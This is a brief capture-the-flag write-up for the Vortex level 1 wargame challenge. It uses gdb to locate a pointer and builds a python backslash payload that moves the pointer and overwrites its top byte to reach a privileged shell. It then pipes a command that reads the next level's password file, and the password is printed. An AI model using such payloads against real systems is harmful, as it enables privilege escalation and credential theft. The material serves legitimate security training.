vortex1.c is included, read the comments  

we need to find a way so that ptr = 0xca<--anyhex-->  

we try appending letters, it doesnt work (neither stack overflow occurs), so we try decreasing...  
using gdb we find ptr address:  
0x0804861c <+92>:    mov    eax,DWORD PTR [esp+0x14]	#this is ptr  

we see that ptr = 0xffffd62b (at srart)  
find where ptr is located: 0xffffd524  
ok, we cant get to address 0xca......, so we'll go back to the address of ptr, and overwrite it...  
ffffd62b – ffffd524 = 0x107 = 263  
we need to write '\\' 263 times followed by "\xca"
python -c 'print "\\"*263 + "\xca\xdf\xc0\x00"' | ./vortex1
we try that, nothing happens, so tinker with the number 263:  
python -c 'print "\\"*261 + "\xca\xdf\xc0\x00"' | ./vortex1  
this time we see the program exits, interesting...  
using strace we see:  
geteuid32()                             = 5001
geteuid32()                             = 5001
geteuid32()                             = 5001
setresuid32(5001, 5001, 5001)           = 0
execve("/bin/sh", ["sh"], [/* 30 vars */]) = 0
indeed we went to shell, but exited immedietly...  
so lets try inserting a bash command:  
(python -c 'print "\\"*261 + "\xca\xdf\xc0\x00"'; echo "cat /etc/vortex_pass/vortex2") | ./vortex1

we get:  
23anbT\rE



